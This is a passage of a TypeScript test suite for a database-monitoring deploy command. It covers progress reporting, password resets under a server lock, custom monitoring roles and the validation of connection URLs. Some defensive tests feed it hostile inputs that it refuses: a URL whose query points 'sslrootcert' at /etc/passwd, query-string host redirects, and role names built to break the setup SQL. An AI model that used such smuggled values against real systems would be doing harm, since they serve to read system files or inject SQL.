  test("the box reports a failed deploy", async () => {
    const { deps } = fake({ rows: [row("failed")] });
    expect((await connect(CH, { waitMs: 60_000 }, deps)).status).toBe("failed");
  });

  test("--wait 0: provisioning, with how to check", async () => {
    const { deps, calls } = fake();
    const result = await connect(CH, { waitMs: 0 }, deps);
    expect(result).toEqual({
      status: "in_progress", provider: "clickhouse", name: CH_NAME, id: "i-1", dashboard_url: null,
      host_metrics: false, ...FREE, next: "pgai mon instances watch i-1",
    });
    expect(calls).not.toContain("sleep");
  });

  test("progress: each step and each change of the box's state once, with the time since the start", async () => {
    const events: ProgressEvent[] = [];
    let t = 0;
    const registered = row("launch_requested", { registered_at: "2026-10-02T00:17:39Z" });
    const { deps } = fake({
      // The launch, then 13 polls of launch_requested, registered, then active.
      rows: [undefined, ...Array(13).fill(row("launch_requested")), registered, registered, row("active")],
      now: () => t,
      sleep: async (ms) => { t += ms; },
      progress: (e) => events.push(e),
    });
    expect((await connect(CH, { waitMs: 20 * 60_000 }, deps)).status).toBe("ready");
    expect(events.map(progressText)).toEqual([
      "Estimated cost: free (1 of 1 free slots) (+0s)",
      "Preparing postgresql://postgres:*****@abc123.us-east-1.aws.pg.clickhouse.cloud:5432/postgres?sslmode=require (+0s)",
      `Provisioning monitoring for ${CH_NAME} (+0s)`,
      "Monitoring box: starting (+0s)",
      "Monitoring box: installing monitoring (+3m30s)",
      "Monitoring box: ready (+4m00s)",
    ]);
    // For an agent the same steps, as events; no checkup of its own (the box runs the first one).
    expect(events.map(({ message, ...e }) => e)).toEqual([
      { event: "billing", elapsed_s: 0 },
      { event: "preparing", elapsed_s: 0 },
      { event: "provisioning", elapsed_s: 0 },
      { event: "box", elapsed_s: 0, state: "launch_requested", id: "i-1" },
      { event: "box", elapsed_s: 210, state: "registered", id: "i-1" },
      { event: "box", elapsed_s: 240, state: "active", id: "i-1" },
    ]);
  });

  test("a re-run of a connected database shows no progress", async () => {
    const events: ProgressEvent[] = [];
    const { deps } = fake({ rows: [row("active")], progress: (e) => events.push(e) });
    expect((await connect(CH, { waitMs: 60_000 }, deps)).status).toBe("ready");
    expect(events).toEqual([]);
  });

  test("the URL's TLS files stay on this machine: not sent to the box", async () => {
    const tls = "postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=verify-full&sslrootcert=%2Ftmp%2Fca.pem";
    const box = "postgresql://postgres_ai_mon:genpw@db.example.com:5432/app?sslmode=verify-full";
    const { deps, calls } = fake({ prepare: async () => ({ monitoringUrl: box }) });
    await connect(tls, { waitMs: 0 }, deps);
    expect(calls.filter((c) => c.startsWith("create"))).toEqual([`create ${JSON.stringify({ db_url: box, allow_ip_fallback: true })}`]);
  });

  test("ClickHouse without a key: connected, and told how to get host metrics", async () => {
    const { deps } = fake({ rows: [row("active", { host_metrics: false })] });
    expect((await connect(CH, { waitMs: 0 }, deps)).next).toBe(
      "Open https://abc.pgai.watch; for CPU, memory and disk, delete the instance (pgai mon instances delete) and deploy again with --clickhouse-key <key-id>:<key-secret>");
  });

  test("--self-hosted: the local stack gets the monitoring URL and the key as env", async () => {
    const { deps, calls } = fake();
    const result = await connect(CH, { clickhouseKey: KEY, selfHosted: true, waitMs: 0 }, deps);
    expect(calls).toEqual([
      `clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud AbCdEf0123456789XyZa`,
      "prepare clickhouse",
      `selfHosted ${MON} ${JSON.stringify({ CLICKHOUSE_ORG_ID: ORG, CLICKHOUSE_KEY_ID: "AbCdEf0123456789XyZa", CLICKHOUSE_KEY_SECRET: "Sec4b1dTestSecret0123456789" })}`,
    ]);
    expect(result).toEqual({ status: "ready", provider: "clickhouse", name: CH_NAME, dashboard_url: "http://localhost:3000", host_metrics: true, next: "pgai mon health" });
  });

  test("--self-hosted with a stack already running here: add the database to it, nothing prepared", async () => {
    const { deps, calls } = fake({ localStackRunning: () => true });
    expect(await connect(CH, { selfHosted: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "A monitoring stack already runs on this machine: add the database with PGAI_DB_URL='<postgres_ai_mon URL>' pgai mon targets add",
    });
    expect(calls).toEqual([]);
  });

  test("a ClickHouse key on another provider, or an unknown provider, is an error", async () => {
    const { deps } = fake();
    await expect(connect("postgresql://u:p@10.0.0.5:5432/app", { clickhouseKey: KEY, waitMs: 0 }, deps)).rejects.toThrow("--clickhouse-key applies to ClickHouse Managed Postgres only");
    await expect(connect(CH, { provider: "oracle", waitMs: 0 }, deps)).rejects.toThrow("--provider must be one of");
  });

  test("an exported ClickHouse key pair is for ClickHouse only: other providers deploy without it", async () => {
    process.env.CLICKHOUSE_KEY_ID = "kid";
    process.env.CLICKHOUSE_KEY_SECRET = "Sec4b1d";
    try {
      const { deps, calls } = fake();
      expect((await connect("postgresql://u:p@10.0.0.5:5432/app", { waitMs: 0 }, deps)).status).toBe("in_progress");
      expect(calls).toEqual(["list", "check self-managed", "prepare self-managed", `create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true })}`]);
      expect((await connect("postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app", { waitMs: 0 }, deps)).next)
        .toBe("Finish in the console: https://console.postgres.ai/acme/monitoring/scale/create/rds");
      await connect(CH, { waitMs: 0 }, deps);
      expect(calls.at(-4)).toBe("clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud kid");
    } finally {
      delete process.env.CLICKHOUSE_KEY_ID;
      delete process.env.CLICKHOUSE_KEY_SECRET;
    }
  });

  test("a poll that fails while waiting keeps the requested box: provisioning, then connected", async () => {
    let polls = 0;
    const { deps } = fake({
      list: async () => {
        if (polls++ === 1) throw new Error("HTTP 502");
        return polls === 1 ? [] : [row("active")];
      },
    });
    expect((await connect(CH, { waitMs: 60_000 }, deps)).status).toBe("ready");
    expect(polls).toBe(3);
  });

  test("every poll failing until the deadline: provisioning, from the state the launch returned", async () => {
    let polls = 0;
    const { deps } = fake({
      list: async () => {
        if (polls++ > 0) throw new Error("HTTP 502");
        return [];
      },
      sleep: (ms) => new Promise((r) => setTimeout(r, ms / 1000)),
    });
    // The wait ran out with the box still starting: not done (exit 3), and how to follow it.
    expect(await connect(CH, { waitMs: 100 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, id: "i-1", dashboard_url: null, host_metrics: false, ...FREE,
      next: "Still in progress (box: starting) when the wait ended: resume with pgai mon instances watch i-1",
    });
    expect(polls).toBeGreaterThan(2);
  });

  test("host or port in the query string is refused: the server prepared must be the server named", async () => {
    const { deps, calls } = fake();
    await expect(connect("postgresql://postgres:pw@db.example.invalid:5432/postgres?host=127.0.0.1&port=32785", { waitMs: 0 }, deps))
      .rejects.toThrow("The URL's query string sets host and port: put the host and the port in the URL itself (postgresql://user:password@host:5432/dbname), so that the server prepared is the server monitored");
    await expect(connect("postgresql://postgres:pw@db.example.invalid/postgres?host=%2Fvar%2Frun%2Fpostgresql", { selfHosted: true, waitMs: 0 }, deps)).rejects.toThrow("sets host:");
    expect(calls).toEqual([]);
    // Certificate files and the rest are the user's own to give.
    expect(() => checkUrlParams("postgresql://postgres:pw@db.example.com/postgres?sslmode=verify-full&sslrootcert=/tmp/ca.pem&sslcert=/tmp/c.pem&sslkey=/tmp/k.pem&options=-c%20role%3Dx&connect_timeout=5")).not.toThrow();
  });

  test("an agent's URL: only the query parameters the box gets, and no ClickHouse key from the environment", async () => {
    const { deps, calls } = fake();
    for (const q of ["sslcert=/home/u/.postgresql/postgresql.crt&sslkey=/home/u/.postgresql/postgresql.key", "sslrootcert=/etc/passwd", "host=127.0.0.1", "options=-c%20role%3Dx", "user=postgres"]) {
      await expect(connect(`postgresql://postgres:pw@db.example.invalid:5432/postgres?sslmode=require&${q}`, { waitMs: 0, agent: true }, deps))
        .rejects.toThrow(`database_url may carry only these query parameters: sslmode, channel_binding, application_name (got: ${q.split("&").map((kv) => kv.split("=")[0]).join(", ")})`);
    }
    expect(calls).toEqual([]);
    expect(() => checkUrlParams("postgresql://postgres@db.example.com/postgres?password=pw&sslmode=require&channel_binding=require&application_name=x", true)).not.toThrow();

    process.env.CLICKHOUSE_KEY_ID = "kid";
    process.env.CLICKHOUSE_KEY_SECRET = "Sec4b1d";
    try {
      expect((await connect(CH, { waitMs: 0, agent: true }, deps)).host_metrics).toBe(false);
      expect(calls).toEqual(["list", "check clickhouse", "prepare clickhouse", `create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, provider: "clickhouse" })}`]);
      // The key the agent passes is used.
      await connect(CH, { clickhouseKey: KEY, waitMs: 0, agent: true }, deps);
      expect(calls).toContain("clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud AbCdEf0123456789XyZa");
    } finally {
      delete process.env.CLICKHOUSE_KEY_ID;
      delete process.env.CLICKHOUSE_KEY_SECRET;
    }
  });

  test.each(["password", "user", "host", "port", "dbname"])("an agent's URL refuses repeated %s before calling dependencies", async (key) => {
    const { deps, calls } = fake();
    await expect(connect(`postgresql://postgres@db.example.com/app?${key}=x&${key}=`, { waitMs: 0, agent: true }, deps))
      .rejects.toThrow(`database_url query parameter ${key} must appear only once`);
    expect(calls).toEqual([]);
  });

  test("an agent's URL refuses a password in both the authority and the query", async () => {
    const { deps, calls } = fake();
    await expect(connect("postgresql://postgres:old@db.example.com/app?password=right", { waitMs: 0, agent: true }, deps))
      .rejects.toThrow("database_url must give the password only once");
    expect(calls).toEqual([]);
  });

  test("an agent's empty effective password never opens a connection with PGPASSWORD set", async () => {
    const previous = process.env.PGPASSWORD;
    process.env.PGPASSWORD = "ambient-test-password";
    const configs: ClientConfig[] = [];
    class FakeClient {
      constructor(config: ClientConfig) { configs.push(config); }
      async connect() { throw new Error("unexpected connection"); }
    }
    try {
      for (const url of ["postgresql://postgres@db.example.com/app?password=", "postgresql://postgres@db.example.com/app"]) {
        const error = await prepareDatabase(url, "self-managed", { agent: true, Client: FakeClient as unknown as PrepareOptions["Client"] }).catch((err) => err);
        expect(configs).toEqual([]);
        expect(error.message).toBe("database_url must be postgresql://user:password@host:5432/dbname, with the password in it");
      }
    } finally {
      if (previous === undefined) delete process.env.PGPASSWORD;
      else process.env.PGPASSWORD = previous;
    }
  });

  test.each(["postgresql://postgres:explicit@db.example.com/app", "postgresql://postgres@db.example.com/app?password=explicit"])("an agent's client config carries its explicit password: %s", async (url) => {
    const configs: ClientConfig[] = [];
    class FakeClient {
      constructor(config: ClientConfig) { configs.push(config); }
      async connect() { throw new Error("offline stop"); }
    }
    await expect(prepareDatabase(url, "self-managed", { agent: true, Client: FakeClient as unknown as PrepareOptions["Client"] })).rejects.toThrow("offline stop");
    expect(configs[0].password).toBe("explicit");
    expect(configs[0].connectionString).toBeUndefined();
  });

  test("--reset-password: refused while another database on the same server is monitored with postgres_ai_mon", async () => {
    const other = row("active", { id: "i-7", name: "abc123.us-east-1.aws.pg.clickhouse.cloud/orders", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432" });
    const { deps, calls } = fake({ rows: [other] });
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "A new password for postgres_ai_mon would cut off the monitoring of abc123.us-east-1.aws.pg.clickhouse.cloud/orders on this server: set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete abc123.us-east-1.aws.pg.clickhouse.cloud/orders --yes first",
    });
    expect(calls).toEqual(["list"]);
  });

  // A custom role's generated password is never shown or kept: --reset-password is its way out.
  test("--monitoring-user with --reset-password: the server's lock, then a reset of that role, never the stored password", async () => {
    // A box elsewhere with a stored password: the platform keeps postgres_ai_mon's only, so it plays no part.
    const elsewhere = row("active", { id: "i-9", name: "other.example.com/app", cluster: "other.example.com:5432", monitoring_password_stored: true });
    const seen: unknown[] = [];
    const { deps, calls } = fake({
      rows: [elsewhere],
      prepare: async (_url, provider, o) => { calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); seen.push(o); return o?.check ? { checked: true } : { monitoringUrl: MON }; },
    });
    expect((await connect(CH, { monitoringUser: "my_mon", resetPassword: true, waitMs: 0 }, deps)).status).toBe("in_progress");
    const warn = expect.any(Function);
    expect(seen).toEqual([{ resetPassword: true, monitoringUser: "my_mon", check: true, warn }, { resetPassword: true, monitoringUser: "my_mon", warn }]);
    expect(calls).toEqual([
      "list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "prepare clickhouse",
      `create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, provider: "clickhouse" })}`, "resetUnlock l-1",
    ]);
  });

  test("--monitoring-user with --reset-password: refused while another database on the server is monitored, naming that role", async () => {
    const other = row("active", { id: "i-7", name: `${SERVER}/orders`, cluster: `${SERVER}:5432`, monitoring_password_stored: true });
    const { deps, calls } = fake({ rows: [other] });
    expect((await connect(CH, { monitoringUser: "my_mon", resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      `A new password for my_mon would cut off the monitoring of ${SERVER}/orders on this server: set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete ${SERVER}/orders --yes first`);
    expect(calls).toEqual(["list"]);
  });

  test("--monitoring-user with --reset-password against a platform without the lock: names that role", async () => {
    const { deps } = fake({ resetLock: async () => { throw new HttpStatusError("Failed to cloud monitoring reset lock (HTTP 404)", 404); } });
    expect((await connect(CH, { monitoringUser: "my_mon", resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      "This platform cannot lock the server for --reset-password yet: set PGAI_MON_PASSWORD to my_mon's password instead");
  });

  test.each(["", "   "])("--monitoring-user empty or blank (%p): refused before anything runs", async (blank) => {
    for (const agent of [false, true]) {
      const { deps, calls } = fake();
      expect(await connect(CH, { monitoringUser: blank, waitMs: 0, agent }, deps)).toEqual({
        status: "action_required", provider: "clickhouse", name: CH_NAME,
        next: `${agent ? "monitoring_user" : "--monitoring-user"} is empty: pass a role name, or leave it out for postgres_ai_mon`,
      });
      expect(calls).toEqual([]);
    }
  });

  test("--monitoring-user is trimmed", async () => {
    const seen: unknown[] = [];
    const { deps } = fake({ prepare: async (_url, _provider, o) => { seen.push(o); return o?.check ? { checked: true } : { monitoringUrl: MON }; } });
    await connect(CH, { monitoringUser: "  my_mon\t", waitMs: 0 }, deps);
    for (const o of seen) expect(o).toMatchObject({ monitoringUser: "my_mon" });
    // Trimmed to the default, it is the default.
    const dflt: unknown[] = [];
    await connect(CH, { monitoringUser: " postgres_ai_mon ", waitMs: 0 }, fake({ prepare: async (_url, _provider, o) => { dflt.push(o); return o?.check ? { checked: true } : { monitoringUrl: MON }; } }).deps);
    for (const o of dflt) expect(o).not.toHaveProperty("monitoringUser");
  });

  // The setup SQL puts the role inside quoted literals, dollar-quoted DO bodies and format() strings.
  test.each(["o'brien", "a$$b", "a$b", "50%mon", "c\\y", "a\nb", "a\u007fb"])("--monitoring-user %p: refused before anything runs (it would break the setup SQL)", async (bad) => {
    for (const agent of [false, true]) {
      const { deps, calls } = fake();
      expect(await connect(CH, { monitoringUser: bad, waitMs: 0, agent }, deps)).toEqual({
        status: "action_required", provider: "clickhouse", name: CH_NAME,
        next: `${agent ? "monitoring_user" : "--monitoring-user"} must not contain ', $, %, backslash or control characters`,
      });
      expect(calls).toEqual([]);
    }
  });

  test("--monitoring-user with a host handed to the console: says the console does not use it", async () => {
    const { deps, calls } = fake();
    expect(await connect("postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app", { monitoringUser: "my_mon", waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "rds", name: "db.abc.us-east-1.rds.amazonaws.com/app",
      next: "Finish in the console: https://console.postgres.ai/acme/monitoring/scale/create/rds (--monitoring-user is not used there)",
    });
    expect(calls).toEqual([]);
  });

  test("--monitoring-user postgres_ai_mon is the default: the stored password is used, and no role is passed on", async () => {
    const stored = row("active", { id: "i-7", name: `${SERVER}/orders`, cluster: `${SERVER}:5432`, monitoring_password_stored: true });
    const seen: unknown[] = [];
    const { deps } = fake({ rows: [stored], prepare: async (_url, _provider, o) => { seen.push(o); return o?.check ? { checked: true } : { monitoringUrl: MON }; } });
    await connect(CH, { monitoringUser: "postgres_ai_mon", waitMs: 0 }, deps);
    expect(seen.length).toBeGreaterThan(0);
    for (const o of seen) {
      expect(o).toMatchObject({ storedPassword: true, others: [`${SERVER}/orders`] });
      expect(o).not.toHaveProperty("monitoringUser");
    }
    // And --reset-password is the default role's, refused as before while another database is monitored.
    expect((await connect(CH, { monitoringUser: "postgres_ai_mon", resetPassword: true, waitMs: 0 }, fake({ rows: [stored] }).deps)).next)
      .toStartWith("A new password for postgres_ai_mon would cut off the monitoring of");
  });

  test("a refused launch drops the custom role this run created, never postgres_ai_mon", async () => {
    const dropped: unknown[] = [];
    const { deps } = fake({
      prepare: async (_url, _provider, o) => (o?.check ? { checked: true } : { monitoringUrl: MON, generated: true }),
      create: async () => { throw new HttpStatusError("Failed to cloud monitoring connect: HTTP 403", 403); },
      unprepare: async (url, user) => { dropped.push([url, user]); return true; },
    });
    await expect(connect(CH, { monitoringUser: "my_mon", waitMs: 0 }, deps)).rejects.toThrow("HTTP 403");
    expect(dropped).toEqual([[CH, "my_mon"]]);
  });

  test("--monitoring-user longer than 63 bytes (Postgres would truncate it): refused before anything runs", async () => {
    const { deps, calls } = fake();
    const long = "m".repeat(62) + "é";
    expect(await connect(CH, { monitoringUser: long, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "--monitoring-user must be at most 63 bytes (Postgres truncates longer role names)",
    });
    expect(calls).toEqual([]);
    expect((await connect(CH, { monitoringUser: "m".repeat(63), waitMs: 0 }, fake().deps)).status).not.toBe("action_required");
  });

  test("--monitoring-user: prepare gets the role, and never the platform's stored password (kept for postgres_ai_mon only)", async () => {
    const stored = row("active", { id: "i-7", name: "abc123.us-east-1.aws.pg.clickhouse.cloud/orders", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", monitoring_password_stored: true });
    const seen: unknown[] = [];
    const { deps } = fake({ rows: [stored], prepare: async (_url, _provider, o) => { seen.push(o); return o?.check ? { checked: true } : { monitoringUrl: MON }; } });
    await connect(CH, { monitoringUser: "my_mon", waitMs: 0 }, deps);
    expect(seen.length).toBeGreaterThan(0);
    for (const o of seen) {
      expect(o).toMatchObject({ monitoringUser: "my_mon" });
      expect(o).not.toHaveProperty("storedPassword");
    }
  });

  test("--reset-password with --self-hosted: refused, the org's cloud monitoring of this server is not checked there", async () => {
    const { deps, calls } = fake();
    expect(await connect(CH, { resetPassword: true, selfHosted: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "--reset-password works with PostgresAI Cloud only (it checks what else monitors this server): deploy without --self-hosted, or set PGAI_MON_PASSWORD",
    });
    expect(calls).toEqual([]);
  });

  // The platform names the instance itself (platform-all#993: "abc123 (ClickHouse)"):
  // the hint names it that way, and ends with the command so the line can be copied.
  test("--reset-password for a database already monitored: nothing reset, delete first", async () => {
    const { deps, calls } = fake({ rows: [row("active", { name: "abc123 (ClickHouse)", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "postgres" })] });
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, id: "i-1",
      next: "abc123 (ClickHouse) is already monitored, and its monitoring uses the current password. Delete it, then run this deploy again with --reset-password: pgai mon instances delete 'abc123 (ClickHouse)' --yes",
    });
    expect(calls).toEqual(["list"]);
  });

  test("--reset-password reaches the prepare step when nothing else on the server is monitored", async () => {
    let seen: unknown;
    const { deps } = fake({ rows: [row("deleting_launched")], prepare: async (url, provider, opts) => { seen = opts; return { monitoringUrl: MON }; } });
    await connect(CH, { resetPassword: true, waitMs: 0 }, deps);
    expect(seen).toEqual({ resetPassword: true, warn: expect.any(Function) });
  });

  const RESET_NEXT = "postgres_ai_mon already exists on this server. Set PGAI_MON_PASSWORD to the password of postgres_ai_mon, or give it a new one: pgai mon deploy <admin-url> --reset-password (anything else that logs in as postgres_ai_mon then needs the new password)";
  const RESET_PROMPT = "A monitoring role from an earlier connection exists, and its password isn't stored. Reset it now? Anything else using this role will need the new password. [y/N] ";

  test("accepting a reset of an earlier connection's role takes the --reset-password path", async () => {
    const seen: unknown[] = [], questions: string[] = [];
    const { deps, calls } = fake({
      confirm: async (q) => { questions.push(q); return true; },
      prepare: async (_url, provider, o) => {
        calls.push(`${o?.check ? "check" : "prepare"} ${provider}`);
        seen.push(o);
        return !o?.resetPassword ? { next: RESET_NEXT, resettable: true as const } : o.check ? { checked: true } : { monitoringUrl: MON };
      },
    });
    expect((await connect(CH, { waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(questions).toEqual([RESET_PROMPT]);
    const warn = expect.any(Function);
    expect(seen).toEqual([{ check: true, warn }, { resetPassword: true, check: true, warn }, { resetPassword: true, warn }]);
    expect(calls).toEqual([
      "list", "check clickhouse", "list", "check clickhouse",
      "resetLock abc123.us-east-1.aws.pg.clickhouse.cloud:5432", "list", "prepare clickhouse",
      `create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, provider: "clickhouse" })}`, "resetUnlock l-1",
    ]);
  });

  test.each(["declined", "non-interactive", "agent", "yes"])("an earlier connection's role: %s leaves everything unchanged", async (mode) => {
    const questions: string[] = [];
    const next = mode === "agent" ? "postgres_ai_mon already exists on this server. Pass its URL as database_url, or run pgai mon deploy in a terminal with PGAI_MON_PASSWORD set to its password" : RESET_NEXT;
    const { deps, calls } = fake({
      confirm: async (q) => { if (mode !== "non-interactive") questions.push(q); return false; },
      prepare: async () => { calls.push("check clickhouse"); return { next, resettable: true as const }; },
    });
    const confirm = spyOn(deps, "confirm");
    expect(await connect(CH, { waitMs: 0, agent: mode === "agent", yes: mode === "yes" || mode === "agent" }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, next,
    });
    if (mode === "yes" || mode === "agent") expect(confirm).not.toHaveBeenCalled();
    expect(questions).toEqual(mode === "declined" ? [RESET_PROMPT] : []);
    expect(calls).toEqual(["list", "check clickhouse"]);
    if (mode !== "agent") expect(next).toContain("--reset-password");
  });

  test.each([false, true])("accepting the reset still refuses other monitoring on the server (under lock: %p)", async (underLock) => {
    const other = row("active", { id: "i-7", name: "abc123.us-east-1.aws.pg.clickhouse.cloud/orders", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432" });
    const { deps, calls } = fake({
      rows: underLock ? [undefined, undefined, other] : [other],
      confirm: async () => true,
      prepare: async (_url, provider, o) => {
        calls.push(`check ${provider}`);
        return o?.resetPassword ? { checked: true } : { next: RESET_NEXT, resettable: true as const };
      },
    });
    const result = await connect(CH, { waitMs: 0 }, deps);
    expect(result.next).toContain(`would cut off the monitoring of ${other.name}`);
    expect(result.status).toBe("action_required");
    expect(calls).toEqual(underLock
      ? ["list", "check clickhouse", "list", "check clickhouse", "resetLock abc123.us-east-1.aws.pg.clickhouse.cloud:5432", "list", "resetUnlock l-1"]
      : ["list", "check clickhouse", "list"]);
  });

  // Two runs at once for databases on one server would each set a new
  // password: the platform's per-server lock lets one through.
  const SERVER = "abc123.us-east-1.aws.pg.clickhouse.cloud";
  for (const underLock of [false, true]) {
    test.each([
      ["a custom name with a known cluster", { name: "Production orders", cluster: `${SERVER}:5432` }, "would"],
      ["a custom name without a cluster", { name: "Production orders", cluster: null }, "may"],
      ["a one-word custom name without a cluster", { name: "production", cluster: null }, "may"],
      ["a plain legacy name without a cluster", { name: `${SERVER}/orders`, cluster: null }, "may"],
      ["a legacy name with percent escapes", { name: `${SERVER}/orders%20data` }, "may"],
      ["a legacy name with non-ASCII text", { name: `${SERVER}/注文` }, "may"],
    ] as const)(`--reset-password with %s (${underLock ? "under the lock" : "before the lock"}): no reset`, async (_, identity, certainty) => {
      const other = row("active", { ...identity, id: "i-7" });
      const { deps, calls } = fake({ rows: underLock ? [undefined, other] : [other] });
      const result = await connect(CH, { resetPassword: true, waitMs: 0 }, deps);
      expect(result.status).toBe("action_required");
      expect(result.next).toContain(`${certainty} cut off the monitoring of ${other.name}`);
      expect(calls).toEqual(underLock ? ["list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "resetUnlock l-1"] : ["list"]);
    });
  }

  test.each(["Production orders", `${SERVER}/orders`, "Monitoring 16bb1d"])("a known other cluster overrides its display name (%s)", async (name) => {
    const identity = { name, cluster: "other.example.com:5432" };
    const { deps, calls } = fake({ rows: [row("active", identity), row("active", identity)] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(calls).toContain("prepare clickhouse");
  });

  test("--reset-password takes the server's lock after the price, checks the server again under it, and releases it once the box is requested", async () => {
    const { deps, calls } = fake({ rows: [undefined, undefined, row("launch_requested")] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(calls.slice(0, 5)).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "prepare clickhouse"]);
    expect(calls[5]).toStartWith("create ");
    expect(calls[6]).toBe("resetUnlock l-1");
  });

  test("--reset-password while another run holds the server's lock: nothing reset, try again later, or after 15 minutes if that run stopped", async () => {
    const { deps, calls } = fake({ resetLock: async (server) => { calls.push(`resetLock ${server}`); throw new HttpStatusError("Failed to cloud monitoring reset lock (HTTP 409): Another pgai mon deploy --reset-password for ... is running", 409); } });
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, ...FREE,
      next: `Another pgai mon deploy --reset-password for ${SERVER}:5432 is running: wait for it to finish, then re-run (a run that stopped frees the server 15 minutes after it started)`,
    });
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`]);
  });

  test("--reset-password: a database on the server connected while this run waited is seen under the lock", async () => {
    const other = row("launch_requested", { id: "i-7", name: `${SERVER}/orders`, cluster: `${SERVER}:5432` });
    const { deps, calls } = fake({ rows: [undefined, other] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      `A new password for postgres_ai_mon would cut off the monitoring of ${SERVER}/orders on this server: set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete ${SERVER}/orders --yes first`);
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "resetUnlock l-1"]);
  });

  // A box whose URL the platform could not read is named "Monitoring <6 hex>":
  // the name does not give its server, so it may be on this one.
  test("--reset-password: a box named Monitoring <hash> may be on this server, before and under the lock", async () => {
    const unread = row("active", { id: "i-8", name: "Monitoring 16bb1d", provider: "self-managed" });
    const other = row("active", { id: "i-7", name: `${SERVER}/orders`, cluster: `${SERVER}:5432` });
    const both = fake();
    both.deps.list = async () => { both.calls.push("list"); return [other, unread]; };
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, both.deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: `A new password for postgres_ai_mon would cut off the monitoring of ${SERVER}/orders on this server, and may cut off the monitoring of Monitoring 16bb1d (the platform could not read its URL, so its server is not known): set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete ${SERVER}/orders --yes and pgai mon instances delete 'Monitoring 16bb1d' --yes first`,
    });
    expect(both.calls).toEqual(["list"]);
    const { deps, calls } = fake({ rows: [undefined, unread] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      "A new password for postgres_ai_mon may cut off the monitoring of Monitoring 16bb1d (the platform could not read its URL, so its server is not known): set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete 'Monitoring 16bb1d' --yes first");
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "resetUnlock l-1"]);
  });

  test("--reset-password: a deleted self-hosted box and launches that failed before their box registered use no role", async () => {
    const gone = [
      row("deactivated", { id: "i-8", name: "old_e2e", provider: "self-managed", cluster: null, registered_at: "2026-10-08T18:40:30Z" }),
      row("failed", { id: "i-9", name: "Monitoring 16bb1d", provider: "self-managed" }),
      row("failed", { id: "i-10", name: `${SERVER}/orders`, cluster: `${SERVER}:5432` }),
    ];
    const { deps, calls } = fake();
    let listed = 0;
    deps.list = async () => { calls.push("list"); return listed++ < 2 ? gone : [...gone, row("launch_requested")]; };
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(calls).toContain("prepare clickhouse");
    // One that failed after its box registered may still log in.
    const ran = fake({ rows: [row("failed", { id: "i-9", name: "Monitoring 16bb1d", provider: "self-managed", registered_at: "2026-10-08T18:40:30Z" })] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, ran.deps)).next)
      .toStartWith("A new password for postgres_ai_mon may cut off the monitoring of Monitoring 16bb1d");
    // A running box whose health check failed (error) may still log in, registered or not.
    const sick = fake({ rows: [row("error", { id: "i-9", name: "Monitoring 16bb1d", provider: "self-managed" })] });
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, sick.deps)).next)
      .toStartWith("A new password for postgres_ai_mon may cut off the monitoring of Monitoring 16bb1d");
    expect(sick.calls).not.toContain("prepare clickhouse");
  });

  test("--reset-password: boxes that share a name are told apart by id, and deleted by id", async () => {
    const twin = (id: string) => row("active", { id, name: "orders (copy)", provider: "self-managed" });
    const { deps } = fake();
    deps.list = async () => [twin("i-8"), twin("i-9"), row("deleting", { id: "i-10", name: "Monitoring 16bb1d" }), row("active", { id: "i-11", name: "Monitoring 16bb1d" })];
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(
